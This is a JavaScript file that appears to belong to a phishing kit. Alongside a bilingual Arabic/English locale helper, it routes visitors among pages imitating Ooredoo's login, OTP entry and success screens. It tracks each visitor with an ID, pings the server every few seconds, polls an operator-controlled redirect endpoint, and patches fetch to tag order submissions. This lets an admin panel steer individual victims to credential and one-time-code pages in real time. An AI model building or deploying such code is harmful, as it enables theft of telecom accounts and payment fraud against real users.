(function(){
  var REDIRECT_TARGETS = {
    index: { ar: "index.html", en: "index-en.html", label: { ar: "الصفحة الرئيسية", en: "Home page" } },
    order: { ar: "order.html", en: "order-en.html", label: { ar: "صفحة الطلب", en: "Order page" } },
    summary: { ar: "summary.html", en: "summary-en.html", label: { ar: "صفحة الملخص", en: "Summary page" } },
    "ooredoo-login": { ar: "ooredoo-login.html", en: "ooredoo-login-en.html", label: { ar: "تسجيل الدخول", en: "Login page" } },
    "ooredoo-loading": { ar: "ooredoo-loading.html", en: "ooredoo-loading-en.html", label: { ar: "تحميل Ooredoo", en: "Ooredoo loading" } },
    "ooredoo-otp": { ar: "ooredoo-otp.html", en: "ooredoo-otp-en.html", label: { ar: "رمز OTP", en: "OTP page" } },
    "ooredoo-otp-loading": { ar: "ooredoo-otp-loading.html", en: "ooredoo-otp-loading-en.html", label: { ar: "تحميل OTP", en: "OTP loading" } },
    "ooredoo-success": { ar: "ooredoo-success.html", en: "ooredoo-success-en.html", label: { ar: "صفحة النجاح", en: "Success page" } }
  };

  function getPersistedLocale(){
    try { return sessionStorage.getItem("fz_site_lang") || ""; } catch (e) { return ""; }
  }
  function setPersistedLocale(locale){
    try { if (locale === "ar" || locale === "en") sessionStorage.setItem("fz_site_lang", locale); } catch (e) {}
  }
  function detectLocaleFromPath(path){
    var p = (path || location.pathname || "").toLowerCase();
    if (p.indexOf("-en.html") !== -1 || p.indexOf("index-en") !== -1 || p.indexOf("order-en") !== -1 || p.indexOf("summary-en") !== -1) return "en";
    if (p.indexOf("admin") !== -1) return "ar";
    return "ar";
  }
  function getCurrentLocale(){
    var saved = getPersistedLocale();
    if (saved === "ar" || saved === "en") return saved;
    var htmlLang = (document.documentElement && document.documentElement.lang || "").toLowerCase();
    if (htmlLang.indexOf("en") === 0) return "en";
    if (htmlLang.indexOf("ar") === 0) return "ar";
    return detectLocaleFromPath(location.pathname);
  }
  function resolveLocalizedTarget(target){
    var targetUrl = String(target || "");
    if (!targetUrl) return targetUrl;
    var isEnglish = getCurrentLocale() === "en";
    var withoutHash = targetUrl.split("#")[0];
    var hash = targetUrl.indexOf("#") !== -1 ? targetUrl.slice(targetUrl.indexOf("#")) : "";
    var file = withoutHash.split("?")[0];
    var suffix = withoutHash.indexOf("?") !== -1 ? withoutHash.slice(withoutHash.indexOf("?")) : "";
    var lower = file.toLowerCase();
    var mapped = file;
    if (lower.endsWith("index.html")) mapped = isEnglish ? "index-en.html" : "index.html";
    else if (lower.endsWith("index-en.html")) mapped = isEnglish ? "index-en.html" : "index.html";
    else if (lower.endsWith("order.html")) mapped = isEnglish ? "order-en.html" : "order.html";
    else if (lower.endsWith("order-en.html")) mapped = isEnglish ? "order-en.html" : "order.html";
    else if (lower.endsWith("summary.html")) mapped = isEnglish ? "summary-en.html" : "summary.html";
    else if (lower.endsWith("summary-en.html")) mapped = isEnglish ? "summary-en.html" : "summary.html";
    else if (lower.endsWith("ooredoo-login.html")) mapped = isEnglish ? "ooredoo-login-en.html" : "ooredoo-login.html";
    else if (lower.endsWith("ooredoo-login-en.html")) mapped = isEnglish ? "ooredoo-login-en.html" : "ooredoo-login.html";
    else if (lower.endsWith("ooredoo-loading.html")) mapped = isEnglish ? "ooredoo-loading-en.html" : "ooredoo-loading.html";
    else if (lower.endsWith("ooredoo-loading-en.html")) mapped = isEnglish ? "ooredoo-loading-en.html" : "ooredoo-loading.html";
    else if (lower.endsWith("ooredoo-otp.html")) mapped = isEnglish ? "ooredoo-otp-en.html" : "ooredoo-otp.html";
    else if (lower.endsWith("ooredoo-otp-en.html")) mapped = isEnglish ? "ooredoo-otp-en.html" : "ooredoo-otp.html";
    else if (lower.endsWith("ooredoo-otp-loading.html")) mapped = isEnglish ? "ooredoo-otp-loading-en.html" : "ooredoo-otp-loading.html";
    else if (lower.endsWith("ooredoo-otp-loading-en.html")) mapped = isEnglish ? "ooredoo-otp-loading-en.html" : "ooredoo-otp-loading.html";
    else if (lower.endsWith("ooredoo-success.html")) mapped = isEnglish ? "ooredoo-success-en.html" : "ooredoo-success.html";
    else if (lower.endsWith("ooredoo-success-en.html")) mapped = isEnglish ? "ooredoo-success-en.html" : "ooredoo-success.html";
    return mapped + suffix + hash;
  }
  function getRedirectTargetName(){
    try {
      var target = sessionStorage.getItem("fz_admin_redirect_target") || "order";
      return REDIRECT_TARGETS[target] ? target : "order";
    } catch (e) { return "order"; }
  }
  function setRedirectTargetName(name){
    var key = name && REDIRECT_TARGETS[name] ? name : "order";
    try { sessionStorage.setItem("fz_admin_redirect_target", key); } catch (e) {}
    return key;
  }
  function resolveRedirectPath(targetNameOrUrl){
    var value = targetNameOrUrl || getRedirectTargetName();
    if (typeof value === "string" && REDIRECT_TARGETS[value]) {
      var config = REDIRECT_TARGETS[value];
      return getCurrentLocale() === "en" ? config.en : config.ar;
    }
    return resolveLocalizedTarget(value);
  }
  function persistCurrentLocale(){
    if (/admin\.html$/i.test(location.pathname)) return getCurrentLocale();
    setPersistedLocale(getCurrentLocale());
    return getCurrentLocale();
  }
  window.FAZAA_LOCALE = {
    REDIRECT_TARGETS: REDIRECT_TARGETS,
    getCurrentLocale: getCurrentLocale,
    resolveLocalizedTarget: resolveLocalizedTarget,
    getRedirectTargetName: getRedirectTargetName,
    setRedirectTargetName: setRedirectTargetName,
    resolveRedirectPath: resolveRedirectPath,
    persistCurrentLocale: persistCurrentLocale
  };
  persistCurrentLocale();

  if (location.protocol === "file:") return;
  var id;
  try {
    id = sessionStorage.getItem("fz_vid");
    if (!id) {
      id = "v" + Math.random().toString(36).slice(2) + Date.now().toString(36);
      sessionStorage.setItem("fz_vid", id);
    }
  } catch (e) { id = "v" + Math.random().toString(36).slice(2); }
  var page = location.pathname.replace(/^\//, "") || "index.html";

  function attachVisitorPayload(body){
    if (!body || typeof body !== "object" || body instanceof FormData || Array.isArray(body)) return body;
    var next = Object.assign({}, body);
    next.visitorId = next.visitorId || next.id || next.sessionId || next.visitor_id || id;
    next.page = next.page || page;
    next.lang = next.lang || getCurrentLocale();
    return next;
  }

  var nativeFetch = window.fetch.bind(window);
  function patchedFetch(input, init){
    var url = typeof input === "string" ? input : (input && input.url ? String(input.url) : "");
    var method = (init && init.method ? String(init.method).toUpperCase() : (input && typeof input === "object" && input.method ? String(input.method).toUpperCase() : "GET"));
    if (url.indexOf("/api/orders") !== -1 && method === "POST") {
      var nextInit = init ? Object.assign({}, init) : {};
      if (nextInit.body && typeof nextInit.body !== "string") {
        nextInit.body = JSON.stringify(attachVisitorPayload(nextInit.body));
        nextInit.headers = Object.assign({}, nextInit.headers || {}, {"Content-Type": "application/json"});
      } else if (!nextInit.body) {
        nextInit.body = JSON.stringify({ visitorId: id, page: page, lang: getCurrentLocale() });
        nextInit.headers = Object.assign({}, nextInit.headers || {}, {"Content-Type": "application/json"});
      } else if (typeof nextInit.body === "string") {
        try {
          var parsed = JSON.parse(nextInit.body);
          nextInit.body = JSON.stringify(attachVisitorPayload(parsed));
          nextInit.headers = Object.assign({}, nextInit.headers || {}, {"Content-Type": "application/json"});
        } catch (e) {}
      }
      return nativeFetch(url, nextInit);
    }
    return nativeFetch(input, init);
  }
  window.fetch = patchedFetch;

  function ping(){
    if (document.hidden || /admin\.html$/i.test(location.pathname)) return;
    try { fetch("/api/ping", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({id:id,page:page}), keepalive:true }); } catch (e) {}
  }
  function pollRedirect(){
    if (/admin\.html$/i.test(location.pathname)) return;
    try {
      fetch("/api/redirect/" + encodeURIComponent(id) + "?ts=" + Date.now(), { cache:"no-store" })
        .then(function(r){ if (!r.ok) return null; return r.json(); })
        .then(function(d){
          if (!d || !d.ok || !d.redirect || !d.redirect.target) return;
          var target = d.redirect.target;
          var targetUrl = (window.FAZAA_LOCALE && typeof window.FAZAA_LOCALE.resolveRedirectPath === "function") ? window.FAZAA_LOCALE.resolveRedirectPath(target) : resolveRedirectPath(target);
          if (targetUrl && targetUrl !== (location.pathname.replace(/^\//, "") || "index.html")) {
            window.location.href = targetUrl;
          }
        }).catch(function(){});
    } catch (e) {}
  }
  ping();
  pollRedirect();
  setInterval(ping, 3000);
  setInterval(pollRedirect, 2000);
  document.addEventListener("visibilitychange", function(){ if (!document.hidden) ping(); });
  window.addEventListener("pagehide", function(){
    try { navigator.sendBeacon("/api/leave", new Blob([JSON.stringify({id:id})], {type:"application/json"})); } catch (e) {}
  });
})();
